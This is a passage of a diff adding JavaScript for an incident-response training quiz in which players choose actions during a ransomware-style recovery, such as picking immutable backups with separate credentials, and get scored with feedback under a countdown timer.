+     ['That is a business decision, not mine',1,'True, but they asked for your input. Give them the facts they need to decide well.']]},
+ {t:'Recovery is underway. What is the one control that would most reduce the impact of a repeat?',
+  o:[['Immutable backups with separate credentials',2,'This is the answer. It removes the attacker leverage entirely by making the backups untouchable.'],
+     ['A more expensive EDR product',0,'EDR caught this one. The failure was that the backups were reachable.'],
+     ['More frequent user awareness training',1,'Valuable, and worth doing, but it reduces likelihood rather than impact.']]}
+];
+function cmd(){
+  G.total=SCEN.length; hud();
+  function step(){
+    if(G.round>=SCEN.length){
+      var max=SCEN.length*2*60;
+      var pct=G.score/max;
+      return finish(pct>=.85?'Commanded well':(pct>=.6?'Incident survived':'Costly night'),
+        pct>=.85?'Contain, then investigate, then notify honestly. You got the sequence right and you did not let pressure push you into the wrong call.'
+        :pct>=.6?'You recovered, but a couple of decisions cost time or evidence. Read the feedback on the ones that stung.'
+        :'Under pressure the instinct is to fix. The discipline is to contain first and be honest second. Run it again.');
+    }
+    var s=SCEN[G.round]; G.round++; hud();
+    play.innerHTML='<p class="rg-q">'+s.t+'</p><div class="rg-opts" style="flex-direction:column">'+
+      s.o.map(function(o,i){return '<button class="rg-o" data-v="'+i+'" style="text-align:left;flex:none;width:100%">'+o[0]+'</button>'}).join('')+
+      '</div><div class="rg-fb" id="fb"></div>';
+    var done=false;
+    play.querySelectorAll('.rg-o').forEach(function(b){
+      b.onclick=function(){
+        if(done)return; done=true; stop();
+        var i=+b.dataset.v, o=s.o[i];
+        play.querySelectorAll('.rg-o').forEach(function(x){x.disabled=true});
+        b.classList.add(o[1]===2?'ok':'no');
+        if(o[1]===2){G.streak++;award(120)}
+        else if(o[1]===1){G.streak=0;award(50);hud()}
+        else if(o[1]===0){G.streak=0;award(20);hud()}
+        else {G.streak=0;hud()}
+        var fb=document.getElementById('fb');
+        fb.className='rg-fb on '+(o[1]===2?'good':'bad');
+        fb.innerHTML='<b>'+(o[1]===2?'Right call.':(o[1]>=0?'Partly.':'That cost you.'))+'</b> '+o[2];
+        var n=document.createElement('button');n.className='rg-next';n.textContent='Continue';
+        n.onclick=step; fb.appendChild(document.createElement('br')); fb.appendChild(n);
+      };
+    });
+    countdown(26000,function(){
+      if(done)return; done=true;
+      G.streak=0; hud();
+      var fb=document.getElementById('fb');
+      fb.className='rg-fb on bad';
+      fb.innerHTML='<b>You hesitated.</b> In a live incident, no decision is itself a decision. '+s.o.filter(function(x){return x[1]===2})[0][2];
+      play.querySelectorAll('.rg-o').forEach(function(x){x.disabled=true});
+      var n=document.createElement('button');n.className='rg-next';n.textContent='Continue';
+      n.onclick=step; fb.appendChild(document.createElement('br')); fb.appendChild(n);
+    });
+  }
+  step();
+}
 
 })();
 </script>
